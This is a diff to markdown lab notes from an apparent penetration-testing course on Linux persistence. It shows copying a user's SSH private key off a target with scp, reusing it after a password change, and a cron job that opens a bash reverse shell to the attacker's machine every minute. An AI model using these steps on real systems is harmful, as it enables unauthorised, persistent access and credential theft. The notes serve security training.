@@ -70,17 +70,17 @@ we have two interesting folders: .ssh folder and a binary folder called wait.
 - cat wait  (when you are done delete the wait binary)
 - cd .ssh/  (here we will find the private key, (generated with sshgn)), cat the content of the private key
 - cat the other content in the ssh file 
-- copy id_rsa onto our system with ``scp`` which will allow us to download a file from the target system to our kali system, via ssh: ``scp student@target_ip:~/file_you_want_to_download ``
+- in your kali terminal: copy id_rsa onto our system with ``scp`` which will allow us to download a file from the target system to our kali system, via ssh: ``scp student@target_ip:~/file_you_want_to_download location_file ``
 			 - ``~/.ssh/id_rsa .``  (the ``.`` means you want to copy it to the directory you currently in)
 
 - give the id_rsa file the permissions that typically associated with private keys : ``chmod 400 id_rsa ``
 
-Log back into the system with ssh and compromised account
+Log back into the system with ssh and compromised account (for simulation purpose do not do this in pentest)
 - when you are SUPER SURE that you downloaded the rsa key you remove the wait file: ``rm wait `` which will reset the connection. 
 
 Even when the user changes the password, we can still login using the **rsa private key.** 
 - ``ssh  -i name_privatekey_file user@target_ip ``
-``   ssh -i id_rsa student@targetip``
+
 
 
 
@@ -100,7 +100,7 @@ first 5 fields are used to specify the time and date
 
 - log onto system with compromised user credentials using ssh: ``ssh user_name@target_ip ``
 - One we set up our crownjob we remove the binary wait to reset and simulate what would happen if the users password would change, taking away our accesspoint. 
-- ``cat /etc/cron ``
+- ``cat /etc/cron ``  or crontac 
 - create cronjob that runs every minute of the day,month,year : 
   ``echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/kali_ip/port_netcat_listernet 0>&1'" > cron``
   
